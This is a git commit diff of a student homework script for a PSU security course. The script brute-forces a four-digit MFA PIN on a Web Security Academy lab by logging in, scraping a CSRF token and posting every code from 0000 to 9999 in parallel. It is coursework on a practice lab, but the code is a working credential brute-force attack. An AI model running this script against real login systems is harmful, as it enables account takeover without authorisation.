6046118f2dc85b30fed068ea2de97999dbc8d818
Andrew Stevenson <ads6@pdx.edu>
2021-04-17 19:13:44 -0700

    Added comments

--- hw1/hw1.py
+++ hw1/hw1.py
@@ -1,3 +1,7 @@
+# hw1.py -- Written by Andrew Stevenson on 4/17/21 for CS 595 at PSU.
+# Checks all possible 4-digit codes to find the correct PIN for account name carlos.
+# Accepts a token as a command line parameter indicating which site to run the test against.
+
 import requests
 import sys  # instructions say to import this lib; but it isn't being used
 from bs4 import BeautifulSoup
@@ -10,10 +14,16 @@ if 'https://' in site:
 """
 # For me only
 site = 'ac671f851f15b44e8031427e00b50093.web-security-academy.net'
-answer = multiprocessing.Value('i', -1)
 
 
 def try_code(csrf, code, s):
+    """Attempts to authenticate with session s to the PIN form. Side effect: prints out PIN if successfully
+    authenticated.
+    :param csrf: The csrf code to use for the attempt
+    :param code: The PIN candidate to use for the attempt
+    :param s: The session object through which to make the attempt
+    :return: The HTTP code returned by the PIN entry form.
+    """
     login2_url = f'https://{site}/login2'
     login2data = {
         'csrf': csrf,
@@ -22,18 +32,18 @@ def try_code(csrf, code, s):
     resp = s.post(login2_url, data=login2data, allow_redirects=False)
     if resp.status_code == 302:
         print(f"PIN is {login2data['mfa-code']}")
-        exit()
-    else:
-        print(".", end='')
     return resp.status_code
 
 
 def get_csrf(s):
+    """Retrieves a valid CSRF code using the credentials carlos : montoya
+    :param s: The session object through which to authenticate
+    :return: The csrf code delivered by the form
+    """
     login_url = f'https://{site}/login'
     resp = s.get(login_url)
     soup = BeautifulSoup(resp.text, 'html.parser')
     csrf = soup.find('input', {'name': 'csrf'}).get('value')
-
     logindata = {
         'csrf': csrf,
         'username': 'carlos',
@@ -45,14 +55,20 @@ def get_csrf(s):
 
 
 def dispatch_requests(arg):
+    """ Dispatch the requests necessary to test a single PIN candidate
+    :param arg: List of the form [code, session] where code is the PIN candidate to test and session is the session
+    object through which to make the attempt.
+    :return: The http code of the response from the PIN form.
+    """
     csrf = get_csrf(arg[1])
-    try_code(csrf, arg[0], arg[1])
+    return try_code(csrf, arg[0], arg[1])
 
 
 if __name__ == '__main__':
     s = requests.Session()
     p = multiprocessing.Pool(40)
-    processing = range(10000)
-    p.map(dispatch_requests, [[x, s] for x in processing])
+    processing = [x for x in range(10000)]
+    results = p.map(dispatch_requests, [[x, s] for x in processing])
     p.close()
-    print("Sorry, PIN not found.")
+    if 302 not in results:
+        print("Sorry, PIN not found.")
